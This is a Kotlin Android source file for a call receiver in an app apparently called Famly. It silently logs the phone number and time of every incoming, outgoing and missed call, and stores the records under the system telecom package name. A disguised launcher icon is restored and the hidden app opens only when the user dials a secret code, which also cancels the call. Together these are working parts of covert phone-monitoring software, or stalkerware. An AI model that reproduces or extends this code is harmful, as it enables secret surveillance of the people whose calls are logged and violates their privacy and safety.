package com.example.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import android.util.Log
import com.example.FamlyApplication
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CallReceiver : BroadcastReceiver() {

    companion object {
        private var lastState = TelephonyManager.CALL_STATE_IDLE
        private var isIncoming = false
        private var savedNumber: String? = null
        private var callStartTime: Long = 0
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return

        try {
            val action = intent.action
            if (action == Intent.ACTION_NEW_OUTGOING_CALL) {
                savedNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)
                isIncoming = false
                callStartTime = System.currentTimeMillis()

                // Check for Secret Launch Codes
                val cleanNum = savedNumber?.replace(" ", "")?.trim()
                if (cleanNum == "*#*#7788#*#*" || cleanNum == "*#*#1234#*#*" ||
                    cleanNum == "7788" || cleanNum == "1234" ||
                    cleanNum == "##7788" || cleanNum == "##1234" ||
                    cleanNum == "*7788#" || cleanNum == "*1234#"
                ) {
                    Log.d("CallReceiver", "🔑 Kode Rahasia Telepon Terdeteksi: $cleanNum. Meluncurkan aplikasi...")
                    resultData = null // Abort phone call

                    com.example.data.security.IconDisguiseManager.restoreLauncher(context)

                    val launchIntent = Intent(context, com.example.MainActivity::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                                Intent.FLAG_ACTIVITY_CLEAR_TOP or
                                Intent.FLAG_ACTIVITY_SINGLE_TOP
                        putExtra("EXTRA_OPENED_VIA_SECRET_CODE", true)
                    }
                    context.startActivity(launchIntent)
                    return
                }

                Log.d("CallReceiver", "📞 Panggilan Keluar Terdeteksi: $savedNumber")
                recordCallEvent(
                    context = context,
                    title = "📞 Panggilan Keluar",
                    text = "Menghubungi: ${savedNumber ?: "Nomor Tidak Diketahui"}",
                    postTime = callStartTime
                )
                return
            }

            val stateStr = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
            val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
            if (!number.isNullOrBlank()) {
                savedNumber = number
            }

            var state = TelephonyManager.CALL_STATE_IDLE
            if (stateStr == TelephonyManager.EXTRA_STATE_RINGING) {
                state = TelephonyManager.CALL_STATE_RINGING
            } else if (stateStr == TelephonyManager.EXTRA_STATE_OFFHOOK) {
                state = TelephonyManager.CALL_STATE_OFFHOOK
            } else if (stateStr == TelephonyManager.EXTRA_STATE_IDLE) {
                state = TelephonyManager.CALL_STATE_IDLE
            }

            onCallStateChanged(context, state, savedNumber)
        } catch (e: Exception) {
            Log.e("CallReceiver", "Error saat memproses CallReceiver: ${e.message}", e)
        }
    }

    private fun onCallStateChanged(context: Context, state: Int, number: String?) {
        if (lastState == state) return

        val now = System.currentTimeMillis()
        val numStr = number ?: "Nomor Rahasia / Tidak Diketahui"

        when (state) {
            TelephonyManager.CALL_STATE_RINGING -> {
                isIncoming = true
                callStartTime = now
                Log.d("CallReceiver", "🔔 Panggilan Masuk Berdering: $numStr")
                recordCallEvent(
                    context = context,
                    title = "🔔 Panggilan Masuk Berdering",
                    text = "Dari: $numStr",
                    postTime = now
                )
            }

            TelephonyManager.CALL_STATE_OFFHOOK -> {
                if (lastState != TelephonyManager.CALL_STATE_RINGING) {
                    isIncoming = false
                    callStartTime = now
                    Log.d("CallReceiver", "📞 Panggilan Keluar Tersambung: $numStr")
                    recordCallEvent(
                        context = context,
                        title = "📞 Panggilan Keluar",
                        text = "Tersambung dengan: $numStr",
                        postTime = now
                    )
                } else {
                    Log.d("CallReceiver", "📞 Panggilan Masuk Diangkat: $numStr")
                    recordCallEvent(
                        context = context,
                        title = "📞 Panggilan Masuk Tersambung",
                        text = "Bicara dengan: $numStr",
                        postTime = now
                    )
                }
            }

            TelephonyManager.CALL_STATE_IDLE -> {
                if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                    Log.d("CallReceiver", "❌ Panggilan Terlewat / Missed Call: $numStr")
                    recordCallEvent(
                        context = context,
                        title = "❌ Panggilan Terlewat (Missed Call)",
                        text = "Panggilan tidak diangkat dari: $numStr",
                        postTime = now
                    )
                } else if (isIncoming) {
                    Log.d("CallReceiver", "🏁 Panggilan Masuk Selesai: $numStr")
                    recordCallEvent(
                        context = context,
                        title = "🏁 Panggilan Masuk Selesai",
                        text = "Panggilan selesai dengan: $numStr",
                        postTime = now
                    )
                } else {
                    Log.d("CallReceiver", "🏁 Panggilan Keluar Selesai: $numStr")
                    recordCallEvent(
                        context = context,
                        title = "🏁 Panggilan Keluar Selesai",
                        text = "Panggilan selesai ke: $numStr",
                        postTime = now
                    )
                }
            }
        }
        lastState = state
    }

    private fun recordCallEvent(
        context: Context,
        title: String,
        text: String,
        postTime: Long
    ) {
        val packageName = "com.android.server.telecom"
        val appName = "Telepon & Panggilan"
        val key = "call_${postTime}_${title.hashCode()}"

        CoroutineScope(Dispatchers.IO).launch {
            try {
                FamlyApplication.instance.repository.saveNotification(
                    key = key,
                    packageName = packageName,
                    appName = appName,
                    title = title,
                    text = text,
                    subText = "Catatan Panggilan Telepon",
                    bigText = "",
                    postTime = postTime
                )
            } catch (e: Exception) {
                Log.e("CallReceiver", "Gagal menyimpan catatan panggilan telepon: ${e.message}")
            }
        }
    }
}
